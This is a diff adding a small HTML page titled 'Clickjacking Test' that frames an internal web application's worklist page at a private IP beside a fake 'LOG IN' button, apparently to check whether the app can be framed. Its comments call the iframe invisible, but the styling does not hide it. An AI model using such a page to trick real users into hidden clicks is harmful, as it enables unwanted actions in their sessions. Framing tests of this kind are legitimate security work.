@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Clickjacking Test</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+      .button {
+        width: 200px;
+        height: 50px;
+        background-color: #4caf50;
+        color: white;
+        text-align: center;
+        line-height: 50px;
+        font-size: 20px;
+        cursor: pointer;
+        border-radius: 5px;
+      }
+      iframe {
+        width: 500px;
+        height: 500px;
+        background-color: #4caf50;
+        color: white;
+        text-align: center;
+        line-height: 50px;
+        font-size: 20px;
+        cursor: pointer;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Clickjacking Test</h1>
+    <p>
+      Click on the "Click Me!" button below, but it will actually click a hidden
+      button inside the iframe.
+    </p>
+
+    <!-- Visible button that the user thinks they're clicking -->
+    <div class="button">LOG IN</div>
+
+    <!-- Invisible iframe that loads a target page (hidden action) -->
+    <iframe
+      src="http://10.42.38.228:8080/NPGWebAppControllerIn/#/worklist"
+    ></iframe>
+  </body>
+</html>
